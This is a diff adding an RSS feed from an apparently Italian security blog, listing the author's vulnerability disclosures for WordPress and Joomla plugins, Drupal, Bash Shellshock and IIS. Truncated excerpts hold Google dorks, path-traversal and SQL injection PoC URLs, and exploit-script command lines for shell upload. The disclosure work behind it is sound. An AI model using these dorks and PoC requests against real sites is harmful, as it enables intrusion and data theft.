@@ -1,0 +1,444 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>bug on HomeLab IT</title>
+    <link>https://www.homelab.it/tags/bug/</link>
+    <description>Recent content in bug on HomeLab IT</description>
+    <image>
+      <url>https://www.homelab.it/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://www.homelab.it/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sat, 02 Jan 2016 18:24:57 +0000</lastBuildDate><atom:link href="https://www.homelab.it/tags/bug/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>DVWA XSS Reflected – Soluzione Completa</title>
+      <link>https://www.homelab.it/index.php/2016/01/02/dvwa-xss-reflected-soluzione-completa/</link>
+      <pubDate>Sat, 02 Jan 2016 18:24:57 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2016/01/02/dvwa-xss-reflected-soluzione-completa/</guid>
+      <description>Eccoci alla risoluzione della prima vulnerabilità che ho affrontato DVWA XSS Reflected, i requisiti per affrontare questo test sono:
+ Browser senza filtri XSS, consiglio Mozilla **Firefox
+**  L’obbiettivo di questo test è iniettare del codice javascript all’interno di una pagina web che stampa a video caratteri passati tramite un form.
+La richiesta avviene tramite metodo GET e la variabile target si chiama “name“.
+Analizzando il sorgente html si può notare come il valore da me inviato (homelab) venga stampato a video tra i tag</description>
+    </item>
+    
+    <item>
+      <title>WP Fast Cache 1.4 and below CSRF Stored/Reflected XSS</title>
+      <link>https://www.homelab.it/index.php/2015/05/27/wp-fast-cache-csrf-xss/</link>
+      <pubDate>Wed, 27 May 2015 20:02:05 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/05/27/wp-fast-cache-csrf-xss/</guid>
+      <description>####################### Exploit Title : WP Fast Cache 1.4 and below CSRF Stored/Reflected XSS# Exploit Author : Claudio Viviani# Website Author: http://www.homelab.ithttp://archive-exploit.homelab.it/1 (Full HomelabIT Vulns Archive)# Vendor Homepage : https://wordpress.org/plugins/wp-fast-cache/# Software Link : https://downloads.wordpress.org/plugin/wp-fast-cache.1.4.zip# Dork Google: index of wp-fast-cache# Date : 2015-05-11# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### InfoWP Fast Cache is vulnerable to CSRF attacks, which can also be combined with stored/reflected XSS attacks (authenticated administrators only).</description>
+    </item>
+    
+    <item>
+      <title>WordPress Video Gallery 2.8 Unprotected Mail Page</title>
+      <link>https://www.homelab.it/index.php/2015/05/22/wordpress-video-gallery-2-8-unprotected-mail-page/</link>
+      <pubDate>Fri, 22 May 2015 09:50:48 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/05/22/wordpress-video-gallery-2-8-unprotected-mail-page/</guid>
+      <description>###################### # Exploit Title : WordPress Video Gallery 2.8 Unprotected Mail Page # Exploit Author : Claudio Viviani # Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery # Software Link : https://downloads.wordpress.org/plugin/contus-video-gallery.2.8.zip # Dork Google: index of &amp;#34;contus-video-gallery&amp;#34; # Date : 2015-04-05 # Tested on : Linux / Mozilla Firefox ###################### # Description Wordpress Video Gallery 2.8 suffers from Unprotected Mail Page. This vulnerability is exploitable to dos, phishing, mailbombing, spam... The &amp;#34;email&amp;#34; ajax action is callable from any guest visitor (/contus-video-gallery/hdflvvideoshare.</description>
+    </item>
+    
+    <item>
+      <title>WordPress NEX-Forms 3.0 SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/21/wordpress-nex-forms-sqli/</link>
+      <pubDate>Mon, 20 Apr 2015 23:40:41 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/21/wordpress-nex-forms-sqli/</guid>
+      <description>####################### Exploit Title : WordPress NEX-Forms 3.0 SQL Injection Vulnerability# Exploit Author : Claudio Viviani# Website Author: http://www.homelab.ithttp://archive-exploit.homelab.it/1 (Full HomelabIT Vulns Archive)# Vendor Homepage : https://wordpress.org/plugins/nex-forms-express-wp-form-builder/# Software Link : https://downloads.wordpress.org/plugin/nex-forms-express-wp-form-builder.3.0.zip# Dork Google: inurl:nex-forms-express-wp-form-builder# index of nex-forms-express-wp-form-builder# Date : 2015-03-29# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### Info:The &amp;#34;submit_nex_form&amp;#34; ajax function is affected from SQL Injection vulnerability#####################Discovered By : Claudio Vivianihttp://www.</description>
+    </item>
+    
+    <item>
+      <title>MS15-034 HTTP.sys (IIS) DoS And Possible Remote Code Execution – AGGIORNAMENTO CRITICO</title>
+      <link>https://www.homelab.it/index.php/2015/04/17/ms15-034-http-sys-iis-dos-and-possible-remote-code-execution-aggiornamento-critico/</link>
+      <pubDate>Thu, 16 Apr 2015 22:01:31 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/17/ms15-034-http-sys-iis-dos-and-possible-remote-code-execution-aggiornamento-critico/</guid>
+      <description>Introduzione E’ stata rilevato un nuovo attacco tramite exploit verso il demone IIS (Internet Information Server) dei sistemi operativi Windows.
+In realtà la libreria vulnerabile si chiama HTTP.sys che viene utilizzata maggiormente dal demone ISS, ma non solo, teoricamente tutti i programmi che ne usufruiscono sono a rischio!
+A cosa serve la libreria HTTP.sys?
+Per farla breve e semplice la sua funzione è quella di elaborare richieste HTTP.
+Tipologia di vulerabilità e Exploit Microsoft ha classificato questa vulnerabilità come Remote Code Execution, ma per adesso pubblicamente sono stati rilasciati exploit ti tipologia DoS:</description>
+    </item>
+    
+    <item>
+      <title>WordPress Ajax Store Locator SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/15/wordpress-ajax-store-locator-sql-injection-vulnerability/</link>
+      <pubDate>Wed, 15 Apr 2015 15:42:06 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/15/wordpress-ajax-store-locator-sql-injection-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Ajax Store Locator &amp;lt;= 1.2 SQL Injection Vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : http://codecanyon.net/item/ajax-store-locator-wordpress/5293356# Software Link : Premium# Dork Google: inurl:ajax-store-locator# index of ajax-store-locator # Date : 2015-03-29# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### Info:The &amp;#34;sl_dal_searchlocation_cbf&amp;#34; ajax function is affected from SQL Injection vulnerability&amp;#34;StoreLocation&amp;#34; var is not sanitized##################### Discovered By : Claudio Viviani http://www.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Video Gallery 2.8 SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/13/wordpress-video-gallery-2-8-sql-injection-vulnerability/</link>
+      <pubDate>Mon, 13 Apr 2015 18:47:15 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/13/wordpress-video-gallery-2-8-sql-injection-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Video Gallery 2.8 SQL Injection Vulnerabilitiy# Exploit Author : Claudio Viviani# Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery# Software Link : https://downloads.wordpress.org/plugin/contus-video-gallery.2.8.zip# Dork Google: inurl:/wp-admin/admin-ajax.php?action=googleadsense# Date : 2015-04-04# Tested on : Linux / Mozilla Firefox ###################### # Description Wordpress Video Gallery 2.8 suffers from SQL injection ###################### # Vulnerability Disclosure Timeline: 2015-04-04: Discovered vulnerability 2015-04-06: Vendor Notification 2015-04-07: Vendor Response/Feedback 2015-04-07: Vendor Send Fix/Patch (same version number) 2015-04-13: Public Disclosure ####################### Discovered By : Claudio Viviani http://www.</description>
+    </item>
+    
+    <item>
+      <title>WordPress N-Media Website Contact Form with File Upload 1.3.4 Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/12/wordpress-n-media-website-contact-form-shell-upload/</link>
+      <pubDate>Sun, 12 Apr 2015 21:03:23 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/12/wordpress-n-media-website-contact-form-shell-upload/</guid>
+      <description>###################### # Exploit Title : WordPress N-Media Website Contact Form with File Upload 1.3.4 Shell Upload Vulnerability # Exploit Author : Claudio Viviani # Software Link : https://downloads.wordpress.org/plugin/website-contact-form-with-file-upload.1.3.4.zip # Date : 2015-04-1# Dork Google: index of website-contact-form-with-file-upload index of /uploads/contact_files/ # Tested on : Linux BackBox 4.0 / curl 7.35.0 ##################### # Info : The &amp;#34;upload_file()&amp;#34; ajax function is affected from unrestircted file upload vulnerability. ##################### Discovered By : Claudio Viviani http://www.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Duplicator 0.5.14 SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/10/wordpress-duplicator-0-5-14-sql-injection-vulnerability/</link>
+      <pubDate>Fri, 10 Apr 2015 08:46:57 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/10/wordpress-duplicator-0-5-14-sql-injection-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Duplicator 0.5.14 SQL Injection Vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : http://lifeinthegrid.com/labs/duplicator/# Software Link : https://downloads.wordpress.org/plugin/duplicator.0.5.14.zip# Date : 2015-04-08# Tested on : Linux / Mozilla Firefox ####################### DescriptionWordPress Duplicator 0.5.14 suffers from remote SQL Injection VulnerabilityLocation file: /view/actions.phpThis is the bugged ajax functions wp_ajax_duplicator_package_delete:function duplicator_package_delete() {DUP_Util::CheckPermissions(&amp;#39;export&amp;#39;);try {global $wpdb;$json	= array();$post	= stripslashes_deep($_POST);$tblName	= $wpdb-&amp;gt;prefix .</description>
+    </item>
+    
+    <item>
+      <title>WordPress All In One WP Security &amp; Firewall 3.9.0 SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/07/wordpress-all-in-one-wp-security-sql-injection-vulnerability/</link>
+      <pubDate>Tue, 07 Apr 2015 07:03:33 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/07/wordpress-all-in-one-wp-security-sql-injection-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress All In One WP Security &amp;amp; Firewall 3.9.0 SQL Injection Vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : https://wordpress.org/plugins/all-in-one-wp-security-and-firewall/# Software Link : https://mega.co.nz/#!DJAEBLBS!IBiukGo-pirelHmsRV80xZDHIvpqZKtTIqsD8YrMf7U# Date : 2015-04-05# Tested on : Linux / Mozilla Firefox####################### DescriptionWordPress All In One WP Security &amp;amp; Firewall 3.9.0 suffers from Blind SQL Injection vulnerabilityThere are some pages with wordpress esc_sql function.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Work the flow file upload 2.5.2 Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2015/04/04/wordpress-work-the-flow-file-upload-vulnerability/</link>
+      <pubDate>Sat, 04 Apr 2015 17:05:53 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/04/04/wordpress-work-the-flow-file-upload-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Work the flow file upload 2.5.2 Shell Upload Vulnerability# Exploit Author : Claudio Viviani# Software Link : https://downloads.wordpress.org/plugin/work-the-flow-file-upload.2.5.2.zip# Date : 2015-03-14# Tested on : Linux BackBox 4.0 / curl 7.35.0####################### Description:Work the Flow File Upload. Embed Html5 User File Uploads and Workflows into pages and posts. Multiple file Drag and Drop upload, Image Gallery display, Reordering and Archiving.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Video Gallery 2.7 SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2015/02/11/wordpress-video-gallery-2-7-sql-injection/</link>
+      <pubDate>Wed, 11 Feb 2015 22:43:44 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/02/11/wordpress-video-gallery-2-7-sql-injection/</guid>
+      <description>####################### Exploit Title : WordPress Video Gallery 2.7 SQL Injection Vulnerabilitiy# Exploit Author : Claudio Viviani# Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery# Software Link : https://downloads.wordpress.org/plugin/contus-video-gallery.2.7.zip# Dork Google: inurl:/wp-admin/admin-ajax.php?action=rss# Date : 2015-02-10# Tested on : Windows 7 / Mozilla FirefoxLinux / Mozilla Firefox ####################### Vulnerability Disclosure Timeline:2015-02-08: Discovered vulnerability2015-02-09: Vendor Notification2015-02-10: Vendor Response/Feedback 2015-02-10: Vendor Send Fix/Patch 2015-02-10: Public Disclosure # DescriptionWordpress Video Gallery 2.</description>
+    </item>
+    
+    <item>
+      <title>WordPress WP Symposium Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/12/11/wordpress-wp-symposium-shell-upload/</link>
+      <pubDate>Thu, 11 Dec 2014 22:24:20 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/12/11/wordpress-wp-symposium-shell-upload/</guid>
+      <description>___ ___ __ | Y .-----.----.--| .-----.----.-----.-----.-----. |. | | _ | _| _ | _ | _| -__|__ --|__ --| |. / \ |_____|__| |_____| __|__| |_____|_____|_____| |: | |__| |::.|:. | `--- ---&amp;#39; ___ ___ _______ _______ __ | Y | _ |______| _ .--.--.--------.-----.-----.-----|__.--.--.--------. |. | |. 1 |______| 1___| | | | _ | _ |__ --| | | | | |. / \ |. ____| |____ |___ |__|__|__| __|_____|_____|__|_____|__|__|__| |: |: | |: 1 |_____| |__| |::.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Ajax Store Locator Arbitrary File Download Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/12/06/wordpress-ajax-store-locator-arbitrary-file-download-vulnerability/</link>
+      <pubDate>Sat, 06 Dec 2014 20:45:11 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/12/06/wordpress-ajax-store-locator-arbitrary-file-download-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Ajax Store Locator &amp;lt;= 1.2 Arbitrary File Download# Exploit Author : Claudio Viviani# Vendor Homepage : http://codecanyon.net/item/ajax-store-locator-wordpress/5293356# Software Link : Premium# Dork Google: inurl:ajax-store-locator# index of ajax-store-locator # Date : 2014-12-06# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### PoC Exploit:http://TARGET/wp-content/plugins/ajax-store-locator-wordpress/sl_file_download.php?download_file=[../../nomefile]orhttp://TARGET/wp-content/plugins/codecanyon-5293356-ajax-store-locator-wordpress/sl_file_download.php?download_file=[../../nomefile]&amp;#34;download_file&amp;#34; variable is not sanitized.#####################Discovered By : Claudio Vivianihttp://www.</description>
+    </item>
+    
+    <item>
+      <title>WordPress wpDataTables 1.5.3 and below Unauthenticated Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/11/23/wordpress-wpdatatables-shell-upload-vulnerability/</link>
+      <pubDate>Sun, 23 Nov 2014 03:05:12 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/11/23/wordpress-wpdatatables-shell-upload-vulnerability/</guid>
+      <description>claudio@backbox3:~/claudio$ python wpdatatables_shell_up.py -t http://10.0.0.67/wordpress -f shell.php ___ ___ __ | Y .-----.----.--| .-----.----.-----.-----.-----. |. | | _ | _| _ | _ | _| -__|__ --|__ --| |. / \ |_____|__| |_____| __|__| |_____|_____|_____| |: | |__| |::.|:. | `--- ---&amp;#39; ___ ___ ______ __ _______ __ __ | Y .-----| _ \ .---.-| |_.---.-| .---.-| |--| .-----.-----. |. | | _ |. | \| _ | _| _ |.</description>
+    </item>
+    
+    <item>
+      <title>WordPress wpDataTables SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/11/23/wordpress-wpdatatables-sql-injection-vulnerability/</link>
+      <pubDate>Sun, 23 Nov 2014 03:05:09 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/11/23/wordpress-wpdatatables-sql-injection-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress wpDataTables 1.5.3 and below SQL Injection Vulnerability# Exploit Author : Claudio Viviani # Software Link : http://wpdatatables.com (Premium)# Date : 2014-11-22# Tested on : Windows 7 / Mozilla FirefoxWindows 7 / sqlmap (0.8-1)Linux / Mozilla FirefoxLinux / sqlmap 1.0-dev-5b2ded0####################### DescriptionWordpress wpDataTables 1.5.3 and below suffers from SQL injection vulnerability&amp;#34;table_id&amp;#34; variable is not sanitized.File: wpdatatables.</description>
+    </item>
+    
+    <item>
+      <title>Joomla HD FLV Player Arbitrary File Download Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/11/15/joomla-hd-flv-player-arbitrary-file-download-vulnerability/</link>
+      <pubDate>Sat, 15 Nov 2014 00:53:14 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/11/15/joomla-hd-flv-player-arbitrary-file-download-vulnerability/</guid>
+      <description>Info # Exploit Title : Joomla HD FLV 2.1.0.1 and below Arbitrary File Download Vulnerability## Exploit Author : Claudio Viviani## Vendor Homepage : http://www.hdflvplayer.net/## Software Link : http://www.hdflvplayer.net/download_count.php?pid=5## Dork google 1: inurl:/component/hdflvplayer/# Dork google 2: inurl:com_hdflvplayer ## Date : 2014-11-11## Tested on : BackBox 3.x/4.x## Info: # Url: http://target/components/com_hdflvplayer/hdflvplayer/download.php?f=# The variable &amp;#34;f&amp;#34; is not sanitized.# Over 80.</description>
+    </item>
+    
+    <item>
+      <title>Joomla HD FLV Player SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/11/13/joomla-hd-flv-player-sql-injection-vulnerability/</link>
+      <pubDate>Thu, 13 Nov 2014 00:20:47 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/11/13/joomla-hd-flv-player-sql-injection-vulnerability/</guid>
+      <description>Info # Exploit Title : Joomla HD FLV Player 2.1.0.1 and below SQL Injection## Exploit Author : Claudio Viviani## Vendor Homepage : http://www.hdflvplayer.net/## Software Link : http://www.hdflvplayer.net/download_count.php?pid=5## Dork google 1: inurl:/component/hdflvplayer/# Dork google 2: inurl:com_hdflvplayer ## Date : 2014-11-11## Tested on : BackBox 3.x/4.x## Info: The variable &amp;#34;id&amp;#34; is not sanitized (again)# Over 80.000 downloads (statistic reported on official site)### Video Demo: http://youtu.</description>
+    </item>
+    
+    <item>
+      <title>Joomla RD Download Sql Injection</title>
+      <link>https://www.homelab.it/index.php/2014/10/29/joomla-rd-download-sql-injection/</link>
+      <pubDate>Wed, 29 Oct 2014 14:55:07 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/10/29/joomla-rd-download-sql-injection/</guid>
+      <description>claudio@backbox3:~$ python j00m_com_rd_download_sql_injection.py -t http://127.0.0.1_______ __ | _ .-----.-----.--------| .---.-. |___| | _ | _ | | | _ | |. | |_____|_____|__|__|__|__|___._| |: 1 | |::.. . | `-------&amp;#39; _______ ______ ______ __ __ | _ | _ \ | _ \ .-----.--.--.--.-----| .-----.---.-.--| ||. l |. | \ |. | \| _ | | | | | | _ | _ | _ ||. _ |.</description>
+    </item>
+    
+    <item>
+      <title>WordPress and Joomla Creative Contact Form Unauthenticated Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/10/24/creative-contact-form-unauthenticated-shell-upload/</link>
+      <pubDate>Thu, 23 Oct 2014 22:19:50 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/10/24/creative-contact-form-unauthenticated-shell-upload/</guid>
+      <description>claudio@backbox3:~$ python wp_j00m_creative_contact_form_shell_upload.py -t http://127.0.0.1/wordpress -f shell.php -c wordpress___ ___ __ __,-,__ | Y .-----.----.--| .-----.----.-----.-----. | &amp;#39; &amp;#39;__| |. | | _ | _| _ | _ | _| -__|__ --| | __| |. / \ |_____|__| |_____| __|__| |_____|_____| |_______| |: | _______ |__| __ |_| |::.|:. | | _ .-----.-----.--------| .---.-. `--- ---&amp;#39; |___| | _ | _ | | | _ | |. | |_____|_____|__|__|__|__|___._| |: 1 | |::.</description>
+    </item>
+    
+    <item>
+      <title>WordPress CP Multi View Event Calendar 1.01 Sql Injection</title>
+      <link>https://www.homelab.it/index.php/2014/10/23/wordpress-cp-multi-view-event-calendar-1-01-sql-injection/</link>
+      <pubDate>Wed, 22 Oct 2014 23:37:14 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/10/23/wordpress-cp-multi-view-event-calendar-1-01-sql-injection/</guid>
+      <description>####################### Exploit Title : WordPress CP Multi View Event Calendar 1.01 SQL Injection Vulnerability# Exploit Author : Claudio Viviani # Software Link : https://downloads.wordpress.org/plugin/cp-multi-view-calendar.zip# Date : 2014-10-23# Tested on : Windows 7 / Mozilla FirefoxWindows 7 / sqlmap (0.8-1)Linux / Mozilla FirefoxLinux / sqlmap 1.0-dev-5b2ded0####################### DescriptionCP Multi View Event Calendar 1.01 suffers from SQL injection vulnerabilitycalid variable is not sanitized.</description>
+    </item>
+    
+    <item>
+      <title>Drupal 7 Sql Injection SA-CORE-2014-005 CVE-2014-3704</title>
+      <link>https://www.homelab.it/index.php/2014/10/17/drupal-7-sql-injection/</link>
+      <pubDate>Thu, 16 Oct 2014 23:05:24 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/10/17/drupal-7-sql-injection/</guid>
+      <description>claudio@backbox3:~$ ./drupal.py -t http://127.0.0.1/drupal -u 4dm1n -p p4ssw0rd______ __ _______ _______ _____ | _ \ .----.--.--.-----.---.-| | | _ || _ | _ | |. | \| _| | | _ | _ | | |___| _|___| |.| | |. | |__| |_____| __|___._|__| / |___(__ `-|. | |: 1 / |__| | | |: 1 | |: | |::.. . / | | |::.. . | |::.| `------&amp;#39; `---&amp;#39; `-------&amp;#39; `---&amp;#39; _______ __ ___ __ __ __ | _ .</description>
+    </item>
+    
+    <item>
+      <title>IPFire Cgi Web Interface Authenticated Bash Environment Variable Code Injection exploit</title>
+      <link>https://www.homelab.it/index.php/2014/09/29/ipfire-cgi-web-interface-authenticated-bash-environment-variable-code-injection-exploit/</link>
+      <pubDate>Mon, 29 Sep 2014 21:58:48 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/29/ipfire-cgi-web-interface-authenticated-bash-environment-variable-code-injection-exploit/</guid>
+      <description>[claudio@localhost ~]$ python ipfire_cgi_shellshock.py___ _______ _______ __ _______ __| | _ | _ |__.----.-----. | _ .-----|__||. |. 1 |. 1___| | _| -__| |. 1___| _ | ||. |. ____|. __) |__|__| |_____| |. |___|___ |__||: |: | |: | |: 1 |_____||::.|::.| |::.| |::.. . |`---`---&amp;#39; `---&amp;#39; `-------&amp;#39;_______ __ __ __ _______ __ __| _ | |--.-----| | | _ | |--.</description>
+    </item>
+    
+    <item>
+      <title>Gnu Bash 4.3 and below Cgi Scan &#43; Remote Command Injection Exploit</title>
+      <link>https://www.homelab.it/index.php/2014/09/26/gnu-bash-4-3-and-below-remote-command-injection-exploit/</link>
+      <pubDate>Fri, 26 Sep 2014 11:31:37 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/26/gnu-bash-4-3-and-below-remote-command-injection-exploit/</guid>
+      <description>[claudio@localhost ~]$ ./bash_env_rci_v2.py_______ _______ __| _ .-----.--.--. | _ .---.-.-----| |--.|. |___| | | | |. 1 | _ |__ --| ||. | |__|__|_____| |. _ |___._|_____|__|__||: 1 | |: 1 \|::.. . | |::.. . /`-------&amp;#39; `-------&amp;#39;___ ___ _______ _______ _______ ___| Y | | _ | | _ | _ | || | |_|___| | |. l |. 1___|.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Face Gallery 1.0 Multiple Vulnerabilities</title>
+      <link>https://www.homelab.it/index.php/2014/09/22/joomla-face-gallery-1-0-multiple-vulnerabilities/</link>
+      <pubDate>Sun, 21 Sep 2014 22:57:48 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/22/joomla-face-gallery-1-0-multiple-vulnerabilities/</guid>
+      <description>####################### Exploit Title : Joomla Face Gallery 1.0 Multiple Vulnerabilities# Exploit Author : Claudio Viviani# Vendor Homepage : https://www.apptha.com# Software Link : https://www.apptha.com/downloadable/download/sample/sample_id/150# Dork Google: inurl:option=com_facegallery# Date : 2014-09-17# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox# Info:# Joomla Face Gallery 1.0 suffers from SQL injection and Arbitrary file download vulnerabilities# PoC Exploit:## http://localhost/index.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Slideshow Gallery 1.4.6 Shell Upload Exploit &#43; Demo</title>
+      <link>https://www.homelab.it/index.php/2014/09/16/wordpress-slideshow-gallery-1-4-6-shell-upload-exploit/</link>
+      <pubDate>Tue, 16 Sep 2014 08:19:21 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/16/wordpress-slideshow-gallery-1-4-6-shell-upload-exploit/</guid>
+      <description>[claudio@localhost ~]$ python wp_gallery_slideshow_146_suv.py -t http://localhost/wordpress -u editor -p editor -f sh33l.php$$$$$$\ $$\ $$\ $$\ $$\$$ __$$\ $$ |\__| $$ | $$ |$$ / \__|$$ |$$\ $$$$$$$ | $$$$$$\ $$$$$$$\ $$$$$$$\ $$$$$$\ $$\ $$\ $$\\$$$$$$\ $$ |$$ |$$ __$$ |$$ __$$\ $$ _____|$$ __$$\ $$ __$$\ $$ | $$ | $$ |\____$$\ $$ |$$ |$$ / $$ |$$$$$$$$ |\$$$$$$\ $$ | $$ |$$ / $$ |$$ | $$ | $$ |$$\ $$ |$$ |$$ |$$ | $$ |$$ ____| \____$$\ $$ | $$ |$$ | $$ |$$ | $$ | $$ |\$$$$$$ |$$ |$$ |\$$$$$$$ |\$$$$$$$\ $$$$$$$ |$$ | $$ |\$$$$$$ |\$$$$$\$$$$ |\______/ \__|\__| \_______| \_______|\_______/ \__| \__| \______/ \_____\____/$$$$$$\ $$\ $$\ $$\ $$\ $$\ $$$$$$\$$ __$$\ $$ |$$ | $$$$ |$$ | $$ | $$ __$$\$$ / \__| $$$$$$\ $$ |$$ | $$$$$$\ $$$$$$\ $$\ $$\ \_$$ |$$ | $$ | $$ / \__|$$ |$$$$\ \____$$\ $$ |$$ |$$ __$$\ $$ __$$\ $$ | $$ | $$ |$$$$$$$$ | $$$$$$$\$$ |\_$$ | $$$$$$$ |$$ |$$ |$$$$$$$$ |$$ | \__|$$ | $$ | $$ |\_____$$ | $$ __$$\$$ | $$ |$$ __$$ |$$ |$$ |$$ ____|$$ | $$ | $$ | $$ | $$ | $$ / $$ |\$$$$$$ |\$$$$$$$ |$$ |$$ |\$$$$$$$\ $$ | \$$$$$$$ | $$$$$$\ $$\ $$ |$$\ $$$$$$ |\______/ \_______|\__|\__| \_______|\__| \____$$ | \______|\__|\__|\__|\______/$$\ $$ |\$$$$$$ |\______/W0rdpr3ss Sl1d3sh04w G4ll3ry 1.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Spider Form Maker 3.4 and below SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/09/13/joomla-spider-form-maker-4-3-sql-injection/</link>
+      <pubDate>Fri, 12 Sep 2014 22:24:40 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/13/joomla-spider-form-maker-4-3-sql-injection/</guid>
+      <description>####################### Exploit Title : Joomla Spider Form Maker &amp;lt;= 3.4 SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://web-dorado.com/# Software Link : http://web-dorado.com/products/joomla-form.html# Dork Google: inurl:com_formmaker# Date : 2014-09-07# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### PoC Exploit:http://localhost/index.php?option=com_formmaker&amp;amp;view=formmaker&amp;amp;id=[SQLi]&amp;#34;id&amp;#34; variable is not sanitized.####################### Vulnerability Disclosure Timeline:2014-09-07: Discovered vulnerability2014-09-09: Vendor Notification2014-09-10: Vendor Response/Feedback2014-09-10: Vendor Fix/Patch2014-09-10: Public Disclosure#####################Discovered By : Claudio Vivianihttp://www.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Spider Contacts 1.3.6 and below SQL Injection vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/09/10/joomla-spider-contacts-1-3-6-and-below-sql-injection-vulnerability/</link>
+      <pubDate>Wed, 10 Sep 2014 21:21:09 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/10/joomla-spider-contacts-1-3-6-and-below-sql-injection-vulnerability/</guid>
